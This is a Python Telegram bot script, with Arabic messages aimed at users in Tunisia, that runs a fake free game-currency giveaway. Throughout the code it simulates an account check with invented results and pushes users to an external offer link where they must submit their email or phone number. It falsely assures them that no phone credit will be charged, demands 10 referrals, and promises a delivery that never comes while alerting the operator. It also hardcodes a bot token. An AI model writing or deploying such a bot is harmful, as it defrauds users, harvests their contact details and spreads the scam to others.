import telebot
import time

TOKEN = "8506914686:AAHJE1oz-PpMH_pvMf1MP-6yL8ZuiZr73Dc"
MY_ID = 6179339486 
WORK_LINK = "https://singingfiles.com/show.php?l=0&u=2512072&id=65271"

bot = telebot.TeleBot(TOKEN)
user_data = {}

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = message.chat.id
    if uid not in user_data: user_data[uid] = {"id_game": None, "invites": 0}
    
    # نظام الإحالة (الـ 10 أشخاص)
    if " " in message.text:
        referrer = message.text.split()[1]
        if referrer.isdigit() and int(referrer) != uid and int(referrer) in user_data:
            user_data[int(referrer)]["invites"] += 1

    bot.send_message(uid, "👑 **أهلاً بك في بوت الشحن الرسمي (تونس)!**\n\nأرسل الـ **ID** الخاص بك الآن لبدء الفحص:")

@bot.message_handler(func=lambda m: m.text.isdigit() and len(m.text) > 5)
def handle_id(message):
    uid = message.chat.id
    game_id = message.text
    user_data[uid]["id_game"] = game_id
    
    bot.send_message(uid, f"🔍 جاري فحص الـ ID: `{game_id}` في السيرفر التونسي...")
    time.sleep(3)
    
    # رسالة "تم العثور"
    bot.send_message(uid, "✅ **تم العثور على الحساب بنجاح!**\n📊 المستوى: `+45`\n🛡️ الحالة: `مؤهل للشحن المجاني`")
    
    time.sleep(1)
    
    # توليد رابط الإحالة
    ref_link = f"https://t.me/{(bot.get_me()).username}?start={uid}"
    
    # --- رسالة الطمأنينة والتحذير المدمجة ---
    msg = (
        "⚠️ **تنبيهات أمنية هامة جداً لضمان الشحن:**\n\n"
        "1️⃣ **لا خوف على رصيدك:** عملية التحقق مجانية 100%، لن يتم سحب أي مليم من رصيد هاتفك، الهدف هو التأكد أنك إنسان لست روبوت.\n\n"
        "2️⃣ **أكمل المهمة للأخير:** يجب إدخال بريدك الإلكتروني أو رقمك وتأكيده بالكامل. إذا أغلقت الصفحة قبل النهاية، لن يتم إرسال الجواهر تلقائياً.\n\n"
        "━━━━━━━━━━━━━━\n"
        f"🔥 **الخطوة الأولى:** [إضغط هنا وأكمل العرض للأخير]({WORK_LINK})\n\n"
        f"🔥 **الخطوة الثانية:** يجب أن يدخل **10 أشخاص** عبر رابطك:\n"
        f"🔗 `{ref_link}`\n\n"
        f"👥 عدد دعواتك الحالية: `{user_data[uid]['invites']}/10`"
    )
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == "تم" or m.text == "تحديث")
def check_status(message):
    uid = message.chat.id
    invites = user_data[uid]["invites"]
    if invites >= 10:
        bot.send_message(uid, "🎊 **تهانينا!** اكتملت شروطك.\nجاري مراجعة إتمامك للعرض بنجاح، سيتم الشحن خلال 12 ساعة.")
        bot.send_message(MY_ID, f"💰 **قيس! شخص كمل الشروط:**\nID اللعبة: `{user_data[uid]['id_game']}`")
    else:
        bot.send_message(uid, f"⚠️ لسه يا بطل، عندك `{invites}/10` دعوات.\nتذكر: لن نتمكن من الشحن لك حتى تكمل المهمة وتصل لـ 10 دعوات!")

bot.infinity_polling()
    
